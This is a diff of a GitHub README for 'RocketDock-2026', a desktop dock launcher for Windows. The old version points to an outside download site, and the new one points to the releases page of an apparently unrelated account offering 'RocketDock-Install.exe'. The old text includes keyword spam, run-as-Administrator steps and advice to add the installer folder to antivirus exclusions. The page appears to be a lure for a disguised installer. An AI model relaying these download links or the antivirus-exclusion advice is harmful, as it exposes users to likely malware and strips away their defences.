@@ -1,79 +1,80 @@
-# RocketDock Download for Windows 11 & 10
+# 🚀 RocketDock-2026 - Organize your desktop applications with ease
 
-**RocketDock-2026**
+[![](https://img.shields.io/badge/Download-RocketDock-blue.svg)](https://github.com/unreflected-bug23/RocketDock-2026/releases)
 
-**RocketDock** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+RocketDock-2026 provides a clean way to manage your computer desktop. This tool adds an animated dock to your screen. You place shortcuts to your favorite programs and folders on this dock. It stays visible while you work and clears clutter from your desktop screen. You can customize the look of the dock to match your style. It works on Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+## 📥 How to download the software
 
----
+You need to access the release page to get the installer for your computer. 
 
-## Download & Install
+1. Visit this page to download: [https://github.com/unreflected-bug23/RocketDock-2026/releases](https://github.com/unreflected-bug23/RocketDock-2026/releases)
+2. Locate the file named RocketDock-Install.exe in the Assets section.
+3. Click the file name to save it to your Downloads folder.
 
-> **This is the download page.** Use the button or link below to get **RocketDock** for Windows.
+## ⚙️ Installation steps
 
-<p align="center">
-  <a href="https://rocketdock.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-RocketDock-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download RocketDock">
-  </a>
-</p>
+Follow these steps to put the software on your system.
 
-| | |
-| --- | --- |
-| **Direct link** | **[rocketdock.nexustool.fun](https://rocketdock.nexustool.fun/)** |
-| **Full URL** | `https://rocketdock.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Open your Downloads folder in File Explorer.
+2. Double-click the RocketDock-Install.exe file.
+3. Select Yes if a window asks for permission to make changes to your computer.
+4. Follow the prompts in the set up window.
+5. Choose your install location or accept the default path.
+6. Click Finish to end the setup.
 
-### Quick steps
+## 🖥️ System requirements
 
-1. Click **[Download — rocketdock.nexustool.fun](https://rocketdock.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+RocketDock-2026 runs on most modern computers. Check your system against this list:
 
-<p align="center"><a href="https://rocketdock.nexustool.fun/"><strong>⬇ Download RocketDock now</strong></a></p>
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: 1 GHz or faster.
+* Memory: At least 2 GB of RAM.
+* Storage: 50 MB of free disk space.
+* Graphics: Support for DirectX 9 or higher.
 
----
+## ✨ Features
 
-## About
+This software includes tools to improve your desktop experience.
 
-**RocketDock** setup page for Windows PC users.
+* Smooth Animations: Icons expand and shrink when your mouse hovers over them.
+* Drag and Drop: Drag any folder or program icon onto the dock to add it instantly.
+* Custom Themes: Select from different visual styles to change the look of your dock.
+* Icon Replacement: Change the appearance of individual icons to match your specific taste.
+* Transparency Settings: Adjust how much you see through the dock background.
+* Position Control: Move the dock to the top, bottom, left, or right edge of your screen.
+* Layering: Keep the dock in front of other windows or behind them.
 
-**People also search for:** rocketdock download, rocketdock install setup windows 2026 dock launcher
+## 🛠️ Setting up your dock
 
-**Repository:** `RocketDock-2026`
+After you launch the program, your dock appears on the screen. Follow these tips to arrange your items.
 
+### Adding items
+Click and hold an icon on your desktop or in your start menu. Drag the icon toward the dock. Release the mouse button. The dock accepts the icon. You can also right-click the dock itself to add items from the menu.
 
-## After install
+### Removing items
+Drag an icon away from the dock and release it. The dock hides the icon in a cloud of smoke. The program remains on your computer. You only remove the shortcut from the dock.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+### Changing settings
+Right-click the center of the dock to open the Settings menu. Here you find tabs for:
+* General: Change the language or set it to run when your computer starts.
+* Icons: Adjust the size of the icons and the quality of the animation.
+* Position: Lock the dock in a specific location or move it to a different monitor.
+* Style: Choose a theme or set the opacity of your dock background.
 
-## System requirements
+## 🔍 Frequently asked questions
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+### Does the dock hide my icons?
+The dock holds shortcuts. It does not delete items from your desktop. You can delete icons from the dock without losing your programs.
 
-## Troubleshooting
+### Can I run multiple docks?
+The current version supports one primary dock. You can place it on any side of your screen.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+### Will this slow down my computer?
+RocketDock-2026 uses minimal system resources. It remains dormant when you do not interact with it.
 
----
+### How do I uninstall the program?
+Open your Windows Control Panel. Select Programs and Features. Find RocketDock-2026 in the list. Right-click it and choose Uninstall. Follow the remaining prompts to remove the software from your system.
 
-**Topics:** rocketdock-download, rocketdock, rocketdock-install-setup-windows-2026-dock-launche, launcher, rocketdock-2026, desktop-dock, customization, software, windows-11, download
+### Can I backup my settings?
+Your settings save to an INI file within the installation folder. Copy this folder to a safe location if you plan to move your setup or reinstall your operating system.
